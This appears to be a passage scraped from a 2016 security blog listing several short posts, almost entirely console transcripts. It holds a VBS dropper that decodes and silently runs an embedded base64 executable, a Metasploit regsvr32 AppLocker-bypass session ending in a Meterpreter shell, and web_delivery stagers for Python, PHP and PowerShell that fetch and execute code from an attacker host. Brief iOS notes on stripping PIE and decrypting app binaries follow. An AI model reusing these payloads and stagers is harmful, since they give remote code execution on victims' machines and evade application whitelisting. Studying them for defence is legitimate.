-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt; echo shellcode = WScript.Arguments.Item(0):strXML = ^&quot;^&lt;B64DECODE xmlns:dt=^&quot; ^&amp; Chr(34) ^&amp; ^&quot;urn:schemas-microsoft-com:datatypes^&quot; ^&amp; Chr(34) ^&amp; ^&quot; ^&quot; ^&amp; ^&quot;dt:dt=^&quot; ^&amp; Chr(34) ^&amp; ^&quot;bin.base64^&quot; ^&amp; Chr(34) ^&amp; ^&quot;^&gt;^&quot; ^&amp; shellcode ^&amp; ^&quot;^&lt;^/B64DECODE^&gt;^&quot;:Set oXMLDoc = CreateObject(^&quot;MSXML2.DOMDocument.3.0^&quot;):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode(^&quot;B64DECODE^&quot;).nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject(^&quot;Scripting.FileSystemObject^&quot;):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir ^&amp; ^&quot;\^&quot; ^&amp; fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir ^&amp; ^&quot;\^&quot; ^&amp; ^&quot;test.exe^&quot;:Dim adodbstream:Set adodbstream = CreateObject(^&quot;ADODB.Stream^&quot;):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject(^&quot;Wscript.Shell^&quot;):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir) &gt; %TEMP%\test.vbs</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator&gt; cscript.exe %TEMP%\test.vbs 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</span><br></pre></td></tr></table></figure>
-<hr>
-<p>###0x04 Metasploit regsvr32_applocker_bypass_server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/misc/regsvr32_applocker_bypass_server</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; set LHOST 192.168.0.100</span><br><span class="line">LHOST =&gt; 192.168.0.100</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; set SRVPORT 8282</span><br><span class="line">SRVPORT =&gt; 8282</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.100:4444</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8282/zS8L0xcR7U0</span><br><span class="line">[*] Local IP: http://192.168.0.100:8282/zS8L0xcR7U0</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.0.100:8282/zS8L0xcR7U0.sct scrobj.dll</span><br><span class="line">[*] 192.168.0.100    regsvr32_applocker_bypass_server - Handling request for the .sct file from 192.168.0.100</span><br><span class="line">[*] 192.168.0.100    regsvr32_applocker_bypass_server - Delivering payload to 192.168.0.100</span><br><span class="line">[*] Sending stage (983599 bytes) to 192.168.0.100</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.100:4444 -&gt; 192.168.0.100:61502) at 2016-10-19 00:51:16 +0800</span><br><span class="line"></span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; sessions -i 1</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/14/Web-Delivery-with-Metasploit/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/10/14/Web-Delivery-with-Metasploit/" itemprop="url">
-                  Web_Delivery with Metasploit
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-14T12:13:27+08:00">
-                2016-10-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-Python"><a href="#0x01-Python" class="headerlink" title="0x01 Python"></a>0x01 Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Python</span><br><span class="line">   1   PHP</span><br><span class="line">   2   PSH</span><br><span class="line">msf exploit(web_delivery) &gt; set target 0</span><br><span class="line">target =&gt; 0</span><br><span class="line">msf exploit(web_delivery) &gt; set payload python/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 111.111.111.111</span><br><span class="line">LHOST =&gt; 111.111.111.111</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/c2pZ0n9EZ</span><br><span class="line">[*] Local IP: http://111.111.111.111:8080/c2pZ0n9EZ</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">python -c &quot;import urllib2; r = urllib2.urlopen(&apos;http://111.111.111.111:8080/c2pZ0n9EZ&apos;); exec(r.read());&quot;</span><br></pre></td></tr></table></figure>
-<h4 id="0x01-PHP"><a href="#0x01-PHP" class="headerlink" title="0x01 PHP"></a>0x01 PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; set target 1</span><br><span class="line">target =&gt; 1</span><br><span class="line">msf &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 111.111.111.111</span><br><span class="line">LHOST =&gt; 111.111.111.111</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 111.111.111.111:8081</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/1G1wlPGJjES4k3</span><br><span class="line">[*] Local IP: http://111.111.111.111:8080/1G1wlPGJjES4k3</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">php -d allow_url_fopen=true -r &quot;eval(file_get_contents(&apos;http://111.111.111.111:8080/1G1wlPGJjES4k3&apos;));&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-Window-PowerShell"><a href="#0x03-Window-PowerShell" class="headerlink" title="0x03 Window PowerShell"></a>0x03 Window PowerShell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; set target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 111.111.111.111</span><br><span class="line">LHOST =&gt; 111.111.111.111</span><br><span class="line">msf exploit(web_delivery) &gt; set LPORT 2333</span><br><span class="line">LPORT =&gt; 2333</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 111.111.111.111:2333</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/5Yk82s</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Local IP: http://111.111.111.111:8080/5Yk82s</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -c $D=new-object net.webclient;$D.proxy=[Net.WebRequest]::GetSystemWebProxy();$D.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $D.downloadstring(&apos;http://111.111.111.111:8080/5Yk82s&apos;);</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/11/Disable-ASLR-on-iOS-applications/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/10/11/Disable-ASLR-on-iOS-applications/" itemprop="url">
-                  Disable ASLR on iOS applications
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-11T17:42:01+08:00">
-                2016-10-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:~ root# cd /var/mobile/Applications/&lt;UUID&gt;/ApplicationBinary.app/</span><br><span class="line">iPhone5S:~ root# ~/removePIE ApplicationBinary</span><br><span class="line"></span><br><span class="line">M1IPhone (architecture armv7):</span><br><span class="line">Mach header</span><br><span class="line">      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags</span><br><span class="line">   MH_MAGIC     ARM         V7  0x00     EXECUTE    57       5788   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE</span><br><span class="line">M1IPhone (architecture arm64):</span><br><span class="line">Mach header</span><br><span class="line">      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags</span><br><span class="line">MH_MAGIC_64   ARM64        ALL  0x00     EXECUTE    57       6408   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/09/IOS-ipa-unpack-via-dumpdecrypted-and-Clutch/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/10/09/IOS-ipa-unpack-via-dumpdecrypted-and-Clutch/" itemprop="url">
-                  IOS ipa unpack via dumpdecrypted and Clutch
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-09T16:10:05+08:00">
-                2016-10-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-Install-dumpdecrypted-Clutch-ifunbox"><a href="#0x01-Install-dumpdecrypted-Clutch-ifunbox" class="headerlink" title="0x01 Install dumpdecrypted Clutch ifunbox"></a>0x01 Install dumpdecrypted Clutch ifunbox</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/stefanesser/dumpdecrypted &amp;&amp; cd dumpdecrypted &amp;&amp; make &amp;&amp; ls</span><br><span class="line">Makefile            dumpdecrypted.c     dumpdecrypted.o</span><br><span class="line">README              dumpdecrypted.dylib</span><br></pre></td></tr></table></figure>
-<p>download <a href="https://github.com/KJCracks/Clutch/releases" target="_blank" rel="external">Cluth</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; scp Cluth root@10.0.250.10:/usr/bin/Clutch</span><br></pre></td></tr></table></figure></p>
-<p>Via <a href="http://www.i-funbox.com/en_download.html" target="_blank" rel="external">ifunbox</a> backup ipa</p>
